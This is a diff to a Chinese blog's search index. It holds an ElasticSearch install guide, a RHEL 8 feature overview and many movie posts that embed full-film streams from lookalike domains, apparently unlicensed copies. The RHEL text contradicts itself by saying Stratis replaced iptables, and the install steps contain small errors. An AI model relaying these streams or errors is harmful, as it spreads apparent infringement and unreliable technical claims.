+      <url>/2019/09/11/ElasticSearch/</url>
+      
+        <content type="html"><![CDATA[<hr><p></p><h1>CentOS7下安装ElasticSearch6.2.4</h1><p></p><p></p><h3>在centos7下安装es二进制包</h3><br><a id="more"></a><br>1、安装JDK<p></p><pre><code>tar -zxvf jdk-8u181-linux-x64.tar.gzmv jdk1.8.0_181 /usr/localcd /usr/local/ln -s jdk1.8.0_181 javavim /etc/profileexport JAVA_HOME=/usr/local/javaexport JRE_HOME=/usr/local/java/jreexport CLASSPATH=.:$CLASSPATH:$JAVA_HOME/lib:$JRE_HOME/libexport PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATHsource /etc/profile</code></pre><p>2、下载elasticsearch 并安装<br>历史版本下载地址 <a href="https://www.elastic.co/downloads/past-releases" target="_blank" rel="noopener">https://www.elastic.co/downloads/past-releases</a></p><pre><code>tar -zxvf elasticsearch-6.2.4.tar.gz -C /usr/localcd /usr/localln -s elasticsearch-6.2.4 elasticsearch</code></pre><p>3、创建一个专门的用户组来运行elasticsearch</p><pre><code>groupadd esgroupuseradd esuser -g esgroup -p espasswordchown -R esuser:esgroup /usr/local/elasticsearch</code></pre><p>4、修改文件最大打开数</p><pre><code>vim /etc/security/limits.confesuser soft nofile 65536esuser hard nofile 65536esuser soft nproc 4096esuer hard nproc 4096vim /etc/security/limits.d/20-nproc.confesuser soft nproc 4096</code></pre><p>5、修改内核参数<br>    vim /etc/sysctl.conf<br>    vm.max_map_count = 655360</p><pre><code>sysctl -p</code></pre><p>6、调整JVM的内存大小</p><pre><code>vim /usr/local/elasticsearch/bin/elasticsearchES_JAVA_OPTS=&quot;-Xms512m -Xmx512m&quot;</code></pre><p>7、切换用户并运行</p><pre><code>su esuserbin/elasticsearch#后台运行bin/elasticsearch -d#测试curl 127.0.0.1:9200</code></pre><p>8、实现远程访问</p><pre><code>vim config/elasticsearch.ymlnetwork.host 192.168.1.1</code></pre><p>9、开机自动启动</p><pre><code>sudo -u esuser /usr/local/elasticsearch/bin/elasticsearch -d</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ElasticSearch </tag>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>RHEL8.0_specific</title>
+      <link href="/2019/09/11/rhel8_specific/"/>
+      <url>/2019/09/11/rhel8_specific/</url>
+      
+        <content type="html"><![CDATA[<hr><p></p><h1>RHEL8.0简介</h1><br>   作为面向云环境和企业IT的强大企业级Linux系统，Red Hat Enterprise Linux 8正式版于今天正式发布。在RHEL 7系列发布将近5年之后，RHEL 8在优化诸多核心组件的同时引入了诸多强大的新功能，从而让用户轻松驾驭各种环境以及支持各种工作负载。Red Hat表示：“RHEL 8是为混合云时代重新设计的操作系统，旨在支持从企业数据中心到多个公共云的工作负载和运作。从Linux容器、混合云到DevOps、人工智能，RHEL 8不仅在混合云中支持企业IT，还可以帮助这些新技术战略蓬勃发展。”<br>   <a id="more"></a><br>   RHEL 8为混合云时代的到来引入了大量新功能，包括用于配置、管理、修复和配置RHEL 8的Red Hat Smart Management扩展程序，以及包含快速迁移框架、编程语言额和诸多开发者工具在内的Application Streams。<br>   RHEL  8同时对管理员和管理区域进行了改善的，让系统管理员、Windows管理员更容易访问，此外通过Red Hat Enterprise Linux System Roles让Linux初学者更快自动化执行复杂任务，以及通过RHEL Web控制台用于管理和监控Red Hat Enterprise Linux系统的运行状况。<br>   在安全方面，RHEL 8内置了对OpenSSL 1.1.1和TLS 1.3加密标准的支持。它还为Red Hat容器工具包提供全面支持，用于创建，运行和共享容器化应用程序，改进对ARM和POWER架构的支持，SAP解决方案和实时应用程序，以及对Red Hat混合云基础架构的支持。<p></p><p></p><h3>RHEL8新特性</h3><br>1，默认集成Cockpit<br>2，RHEL8提供了基于DNF的YUM版本的新版本。这个新版本兼容YUM v3 (RHEL7)<br>3，RPM v4.14，RPM现在会在开始安装之前验证整个包的内容<br>4，两个主要存储库:BaseOS和应用程序流(AppStream)<br>5，RHEL8支持最多4PB的物理内存（RHEL7为64TB）<br>6，Wayland是RHEL8中的默认显示服务器，而不是Xorg服务器<br>7，GNOME版本 v3.28，<br>8，XFS现在支持共享的写时复制（CoW）数据区段<br>9，新的本地存储管理器Stratis，它在存储池上提供托管文件系统<br>10，nftables替代iptables作为默认的网络过滤框架<br>11，nftables成为firewalld守护进程的默认后端<br>12，Python 3.6是RHEL8中的默认Python版本<br>13，PHP版本为PHP 7.2<br>14，Nginx 1.14在RHEL8的核心存储库中可用<br>15，RHEL8中包括MySQL 8.0、MariaDB 10.3、PostgreSQL 10 &amp; 9.6和Redis 4.0<br>16，OpenSSH包已升级到7.8p1，并删除了对SSH version 1协议的支持<br>17，QEMU-KVM v2.12，这个版本提供了一些新的增强特性，比如UEFI引导、vCPU热插拔、客户I/O线程<br>和Q35机器类型。<p></p><p>•基本功能</p><pre><code>RHEL8 中常用的服务，基本都做了升级。</code></pre><p>•桌面</p><pre><code>采用GNome 3.28 图形桌面，采用Wayland 显示X服务器。RHEL8没有了Application菜单，RHEL7是Activities菜单。</code></pre><p>•内核</p><pre><code>RHEL8采用Linux Kernel 4.18。RHEL7采用Linux Kernel 3.10。4.18 Kernel支持物理内存限制从64TB提升到4PB，可管理的虚拟地址更是高达128PB之多。</code></pre><p>•文件系统</p><pre><code>XFS文件系统支持Copy-on-write能力，多个文件就可以共享数据块，节约存储空间，也方便容器应用的使用。Stratis卷文件系统的支持，更方便支持文件快照，块存储池等特性需求。Virtual Data Optimizer（VDO）虚拟数据层，可以管理，重用和压缩文件存储块设备。可以极大的减少实际物理空间的占用。</code></pre><p>•网络</p><pre><code>Stratis替代了iptables，作为缺省的网络包过滤组件</code></pre><p>•包管理</p><pre><code>RHEL8全面使用Yum 4 ，基于DNF包管理工具。提供了Application Stream应用程序流功能；BaseOS是基础仓库，包含操作系统必备的功能；其他的安装包由AppSteam来管理，使用module的概念，为一个或者若干个rpm包组成的完整功能包。而module可以包括多个版本，用户在安装时可以选择需要的版本。</code></pre><p>•管理工具</p><pre><code>新增一个管理工具Cockpit（含义是驾驶员座舱），具备完备的界面管理功能。类似于微软的mmc，可以管理本地，也可以管理远程。目前可管理日志、网络、账户、服务、安全、虚拟机、容器等几乎所有的服务器功能。</code></pre><p>•安全</p><pre><code>系统级支持TLS 1.3，openssl版本对应升级。加密块设备LUKS也升级到版本2。</code></pre><p>•开发环境</p><pre><code>GCC版本升级到8.2， glibc库为2.28Python 版本默认安装 3</code></pre><p>•虚拟化</p><pre><code>RHEL8中增加了Composer工具，创建虚拟机镜像</code></pre><p>•容器技术</p><pre><code>RHEL8中，还提供了容器的管理工具：podman管理容器的客户端工具，命令行基本和docker兼容buildah创建OCI兼容的容器镜像skopeo容器镜像仓库工具</code></pre><p>RHEL 8 下载地址<a href="https://developers.redhat.com/rhel8/" target="_blank" rel="noopener">https://developers.redhat.com/rhel8/</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+            <tag> linux-specific </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Naked Weapon</title>
+      <link href="/2019/09/05/Naked%20Weapon/"/>
+      <url>/2019/09/05/Naked%20Weapon/</url>
+      
+        <content type="html"><![CDATA[<p><script type="text/javascript" src="/assets/js/hls.min.js"></script></p><p></p><h1>简介</h1><br>  《赤裸特工》电影主要讲述一个特工组织派出女杀手以跳舞女郎的身份接近目标，然后在按摩过程中扭断目标脊柱使其毙命的故事。<br> <a id="more"></a><p></p><p></p><h2>正片 赤裸特工</h2><br><div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"video":{"url":"https://youku.com-a-youku.com/20190817/17400_1eb0e08a/1000k/hls/index.m3u8"},"danmaku":{"api":"//dplayer.daoapp.io","token":"tokendemo"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script><p></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>鬼干部</title>
+      <link href="/2019/08/24/%E9%AC%BC%E5%B9%B2%E9%83%A8/"/>
+      <url>/2019/08/24/%E9%AC%BC%E5%B9%B2%E9%83%A8/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>剧情简介</h1><br>   影片中的剧情大概剧情是，五千年来，因血魔作祟，附于有权势之人身上，历代暴君，置人民于水深火热中，血流成河，无名英雄引血魔为伏羲针所镇，此举必需牺牲自己生命。文化大革命爆发，破四旧运动令本来深埋黑洞里的血魔逃出，自小有心脏病的梁国栋（红卫兵）与林刚（赤脚医生），因“运动”而对立，但在生离死别、家破人亡之后，两人误会冰释，联手与血魔对抗。血魔附于革委副主任雷复鸣身上，雷性情大变。其女雷珊，与栋及刚又有微妙三角关系，三人一起与血魔展开决战，林刚目睹文革毒害，不但丧失一代文化精英，且举国人魔不分，尸横遍野，终看破红尘，斩断情缘，成全手足 。<p></p><p></p><h2>正片 鬼干部</h2><br><a id="more"></a><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer17" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer17"),"video":{"url":"https://youku.com-l-youku.com/20181218/4273_40719655/1000k/hls/index.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>灵幻至尊</title>
+      <link href="/2019/08/24/%E7%81%B5%E5%B9%BB%E8%87%B3%E5%B0%8A/"/>
+      <url>/2019/08/24/%E7%81%B5%E5%B9%BB%E8%87%B3%E5%B0%8A/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>剧情简介</h1><br>   茅山弟子傲天龙（林正英 饰）与大黄（郑则士 饰）同时爱上了师傅的掌上明珠梦梦，师傅临终前设局考验二人谁更真心，大黄用计赢得了师傅的信任。虽然梦梦倾心天龙，无奈父命难为，天龙于是愤然出走。一晃十八年过去了，大黄和梦梦的儿子连高（金少龙 饰）已经长成英俊少年，而天龙的女儿凝红（黎姿 饰）也成年。天龙父女俩这天回家乡探亲，半途上遇到红袍火鬼为祸人间。天龙费尽九牛二虎之力将其收伏，关在鬼笼内。回到家乡，大黄和天龙两师兄弟心里还是有隔阂，互相敌视。连高无意中放出了火鬼，此时的火鬼法力大增，天龙和大黄都已无法独力应付。为了对付火鬼，二人终于抛开成见，再次合作。<p></p><p></p><h2>正片 灵幻至尊(1991）</h2><br><a id="more"></a><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer10" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer10"),"video":{"url":"https://v-acfun.com/20180908/19128_7347a396/800k/hls/index.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>音乐僵尸</title>
+      <link href="/2019/08/24/%E9%9F%B3%E4%B9%90%E5%83%B5%E5%B0%B8/"/>
+      <url>/2019/08/24/%E9%9F%B3%E4%B9%90%E5%83%B5%E5%B0%B8/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>剧情简介</h1><br>   茅山道士麻麻地（冯淬帆 饰）与同行不和，带着两个徒弟阿豪（李家声 饰）和阿强（熊欣欣 饰）另起炉灶，在江南一带赶事为业。两个徒弟顽劣非常，经常操纵僵尸互相对打。阿豪自认法术修成，请求师傅让其独立赶尸。得到师傅应允，阿豪赶着一只大地主任天棠的僵尸独自上路。路遇从旧金山归国的时尚女孩珠珠（李丽珍 饰），玩心骤起，将珠珠戏耍了一番。然而半夜阿豪遭到一群人袭击，僵尸被抢。幕后指示者原来是一个外国科学家，他希望研究僵尸获得诺贝尔奖。但在注射一种药物之后僵尸复活，大开杀戒，似乎只有珠珠怀表中的音乐能让他安静下来……<p></p><p></p><h2>正片 音乐僵尸</h2><br><a id="more"></a><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer16" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer16"),"video":{"url":"https://youku.cdn-tudou.com/20180531/6206_9d68fc4d/1000k/hls/index.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一眉道人</title>
+      <link href="/2019/08/24/%E4%B8%80%E7%9C%89%E9%81%93%E4%BA%BA/"/>
+      <url>/2019/08/24/%E4%B8%80%E7%9C%89%E9%81%93%E4%BA%BA/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>剧情简介</h1><br>   一眉道人修为高强，擅长茅山道术，和徒弟阿豪住在一个小镇上，他养了一只清朝的小僵尸，小僵尸经常帮他和阿豪办事。一天，一眉道人被邻镇的人邀请去捉鬼，因为邻镇瘟疫蔓延，不时有僵尸出没。邻镇乡公所的所长意外令西洋僵尸复活了，一场精彩的中国法术对付西洋僵尸的好戏上演了。<p></p><p></p><h2>正片 一眉道人(1989)</h2><br><a id="more"></a><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer3" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer3"),"video":{"url":"https://vip.okokbo.com/20171221/XduVSyRI/800kb/hls/index.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>僵尸先生</title>
+      <link href="/2019/08/24/%E5%83%B5%E5%B0%B8%E5%85%88%E7%94%9F/"/>
+      <url>/2019/08/24/%E5%83%B5%E5%B0%B8%E5%85%88%E7%94%9F/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>剧情简介</h1><br>   富贵乡绅任发（黄虾 饰）先父当年威逼利诱求得一块风水宝地，经风水先生指点，其父下葬二十年后起坟迁葬，以利子孙。然九叔（林正英 饰）察看墓穴得知，当年风水先生与任家私怨在身，在墓穴中做下手脚，二十年后任老太爷尸体已生恶变。九叔提议就地火化，在任老爷请求下才将尸骨移往义庄。虽经小心看护，但任老太爷仍化作僵尸，将其子任发杀害。九叔断定任老太爷和任发的僵尸将再次出现，于是命令徒弟秋生（钱小豪 饰）和文才（许冠英 饰）小心应付……<p></p><p></p><h2>正片 僵尸先生(1985)</h2><br><a id="more"></a><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer6" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer6"),"video":{"url":"https://vip.okokbo.com/20171213/fTGJqOpC/800kb/hls/index.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>僵尸家族</title>
+      <link href="/2019/08/24/%E5%83%B5%E5%B0%B8%E5%AE%B6%E6%97%8F/"/>
+      <url>/2019/08/24/%E5%83%B5%E5%B0%B8%E5%AE%B6%E6%97%8F/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>剧情简介</h1><br>   一次偶然中，古董商人郭敦煌（钟发 饰）和其徒弟发现了一座古墓，墓中躺着三具额头上贴有符纸的僵尸，在僵尸的身上，郭敦煌发现了生财之道，却在无意之中将镇压僵尸的符纸弄掉，引得僵尸复活，他的徒弟亦因为和僵尸搏斗而身负重伤。郭敦煌一行人找到了林医生（林正英 饰），求其救治，林医生告诉三人，僵尸十分危险，必须将其彻底消灭。然而，郭敦煌却并不愿意放弃好不容易弄到手的摇钱树，与此同时，警方亦闻风而动，情势十分混乱。男僵尸（张荣祥 饰）和女僵尸（王玉环 饰）千方百计寻找逃脱的办法，小僵尸（何建成 饰）却和人类小孩交起了朋友。<p></p><p></p><h2>正片 僵尸家族(1986)</h2><br><a id="more"></a><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer7" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer7"),"video":{"url":"https://vip.okokbo.com/20171231/s750us5P/800kb/hls/index.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>天地玄门</title>
+      <link href="/2019/08/24/%E5%A4%A9%E5%9C%B0%E7%8E%84%E9%97%A8/"/>
+      <url>/2019/08/24/%E5%A4%A9%E5%9C%B0%E7%8E%84%E9%97%A8/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>剧情简介</h1><br>    明代孝宗年间，施家镇出现扶桑鬼王（左颂升 饰）危害人间，并霸占美女施施（王祖贤 饰）为爱姬。鬼王伤害性命无数，惹得天怒人怨，皇上任命正直武官马尚峰（成奎安 饰）捉拿鬼王。正当愁眉不展之际，师爷向马举荐身怀绝技的草芦居士（林正英 饰）帮忙，却得知为除鬼王需牺牲自己的性命。马愤愤返回，草芦居士设计令马尚峰假死，使其化为金甲武士与徒弟（黄一山 饰）担任自己的左右护卫。师徒三人与鬼王展开艰苦鏖战，却由此导致天地玄门大开，正邪双方穿越时空，来至现代。在这里，师徒三人各自遭遇不同的蹊跷趣事。偶然机会，草芦居士发现酷似施施的女医生Gigi。绵延数百年的正邪大战将再次展开……<p></p><p></p><h2>正片 天地玄门</h2><br><a id="more"></a><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer8" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer8"),"video":{"url":"https://youku.com-youku.com/20180316/XOdLGDxr/900kb/hls/index.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一代枭雄之三支旗</title>
+      <link href="/2019/08/13/%E4%B8%80%E4%BB%A3%E6%9E%AD%E9%9B%84%E4%B9%8B%E4%B8%89%E6%94%AF%E6%97%97/"/>
+      <url>/2019/08/13/%E4%B8%80%E4%BB%A3%E6%9E%AD%E9%9B%84%E4%B9%8B%E4%B8%89%E6%94%AF%E6%97%97/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>简介</h1><br><a id="more"></a><br>    《一代枭雄之三支旗》是由黄泰来执导，吕良伟、吴毅将、叶玉卿等领衔主演的喜剧片。影片讲述了学警陈志超经过奋斗升为新部门“三支旗”的总舵主的故事。<p></p><p></p><h2>正片 一代枭雄之三支旗</h2><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer2" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer2"),"video":{"url":"https://56.com-t-56.com/20190520/21526_31f0e53f/1000k/hls/index.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>二代宗师</title>
+      <link href="/2019/08/13/%E4%BA%8C%E4%BB%A3%E5%AE%97%E5%B8%88/"/>
+      <url>/2019/08/13/%E4%BA%8C%E4%BB%A3%E5%AE%97%E5%B8%88/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>简介</h1><br><a id="more"></a><br>    2019年5月21日，由董伟导演，蔡丙国出品，陈洛曦监制，吴建雯、李开浓、方培勇、卢冠廷制片，张致恒、金丽婷、钟一宪、高维蔓、王曦主演的电影《二代宗师》<p></p><p></p><h2>正片 二代宗师</h2><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer4" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer4"),"video":{"url":"https://youku.com-okzy.com/20190521/426_5de616ef/1000k/hls/index.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>恐怖故事2</title>
+      <link href="/2019/08/13/%E6%81%90%E6%80%96%E6%95%85%E4%BA%8B2/"/>
+      <url>/2019/08/13/%E6%81%90%E6%80%96%E6%95%85%E4%BA%8B2/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>简介</h1><br>    《恐怖故事2》是由Soofilm公司制作，乐天娱乐出品的恐怖故事系列电影，是《恐怖故事》（2012年）的续篇。<p></p><p></p><h2>正片 恐怖故事2</h2><br><a id="more"></a><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer9" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer9"),"video":{"url":"https://hot.jingpin88.com/ppvod/7B4D880799F1E27A8B502A744A9D0B0A.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>脱单好难</title>
+      <link href="/2019/08/13/%E8%84%B1%E5%8D%95%E5%A5%BD%E9%9A%BE/"/>
+      <url>/2019/08/13/%E8%84%B1%E5%8D%95%E5%A5%BD%E9%9A%BE/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>简介</h1><br>    总是当电灯泡的单身女子崔娜，工作爱情都不顺，但天菜级的帅哥尼欧出现后，好运似乎开始降临。崔娜先是被晋升为广告企划，梦中情人般的尼欧更成了她的同事，让两人的距离迅速拉近。正当她以为终于可以摆脱单身，却发现尼欧有个儿子，而他的前妻也来搅局。崔娜能否跨越重重考验，得到她梦寐以求的真命天菜？<br><a id="more"></a><p></p><p></p><h2>正片 脱单好难</h2><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer12" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer12"),"video":{"url":"https://56.com-t-56.com/20190612/23260_5b58b7f8/1000k/hls/index.m3u8"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>钵兰街大少</title>
+      <link href="/2019/08/13/%E9%92%B5%E5%85%B0%E8%A1%97%E5%A4%A7%E5%B0%91/"/>
+      <url>/2019/08/13/%E9%92%B5%E5%85%B0%E8%A1%97%E5%A4%A7%E5%B0%91/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>简介</h1><br>    《钵兰街大少》是张乾文1993年执导的电影，由张卫健、任达华等主演。讲述了亚豹与大兜两人自小在砵兰街长大，一起揾食及媾女，过着沙保兄弟的生活而后来发生种种变故的故事。<br><a id="more"></a><p></p><p></p><h2>正片 钵兰街大少</h2><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer14" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer14"),"video":{"url":"https://youku.com-t-youku.com/20190516/20901_f10582df/1000k/hls/index.m3u8"},"danmaku":{"api":"//dplayer.daoapp.io","token":"tokendemo"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>使徒行者2：谍影行动</title>
+      <link href="/2019/08/13/%E4%BD%BF%E5%BE%92%E8%A1%8C%E8%80%852%EF%BC%9A%E8%B0%8D%E5%BD%B1%E8%A1%8C%E5%8A%A8/"/>
+      <url>/2019/08/13/%E4%BD%BF%E5%BE%92%E8%A1%8C%E8%80%852%EF%BC%9A%E8%B0%8D%E5%BD%B1%E8%A1%8C%E5%8A%A8/</url>
+      
+        <content type="html"><![CDATA[<p><script type="text/javascript" src="/assets/js/hls.min.js"></script></p><p></p><h1>简介</h1><br><a id="more"></a><br>    影片讲述一对兄弟幼时失散，30年后因一桩罪案相见，随着对罪案调查的深入，一个多年来隐于幕后的黑警组织渐渐浮出水面的故事 [2]  。<p></p><p></p><h2>正片 使徒行者2：谍影行动</h2><br><div id="dplayer5" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer5"),"video":{"url":"https://iqiyi.com-l-iqiyi.com/20190823/22551_706ce3a1/1000k/hls/index.m3u8"},"danmaku":{"api":"//dplayer.daoapp.io","token":"tokendemo"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script><p></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>逃学英雄传</title>
+      <link href="/2019/08/13/%E9%80%83%E5%AD%A6%E8%8B%B1%E9%9B%84%E4%BC%A0/"/>
+      <url>/2019/08/13/%E9%80%83%E5%AD%A6%E8%8B%B1%E9%9B%84%E4%BC%A0/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>简介</h1><br>  《逃学英雄传》是由王晶执导， 郭富城、邱淑贞、张坚庭、张敏、吴孟达、黄一山主演的喜剧片。<br>   影片讲述了圣育强中学的顽劣学生、卧底老师之间的搞笑故事。<br> <a id="more"></a><p></p><p></p><h2>正片 逃学英雄传</h2><br><div id="dplayer13" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer13"),"video":{"url":"https://sina.com-h-sina.com/20190126/28914_0c231c0c/1000k/hls/index.m3u8"},"danmaku":{"api":"//dplayer.daoapp.io","token":"tokendemo"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script><p></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>陈翔六点半之重楼别</title>
+      <link href="/2019/08/13/%E9%99%88%E7%BF%94%E5%85%AD%E7%82%B9%E5%8D%8A%E4%B9%8B%E9%87%8D%E6%A5%BC%E5%88%AB/"/>
+      <url>/2019/08/13/%E9%99%88%E7%BF%94%E5%85%AD%E7%82%B9%E5%8D%8A%E4%B9%8B%E9%87%8D%E6%A5%BC%E5%88%AB/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>简介</h1><br>  《陈翔六点半之重楼别》是由陈翔执导，毛台、冷檬、闰土、蘑菇头主演的爆笑戏曲喜剧。<p></p><p></p><h2>正片 陈翔六点半之重楼别</h2><br><a id="more"></a><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer15" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer15"),"video":{"url":"https://56.com-t-56.com/20190711/23647_3194d7c8/1000k/hls/index.m3u8"},"danmaku":{"api":"//dplayer.daoapp.io","token":"tokendemo"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>猛鬼屠房</title>
+      <link href="/2019/08/13/%E7%8C%9B%E9%AC%BC%E5%B1%A0%E6%88%BF/"/>
+      <url>/2019/08/13/%E7%8C%9B%E9%AC%BC%E5%B1%A0%E6%88%BF/</url>
+      
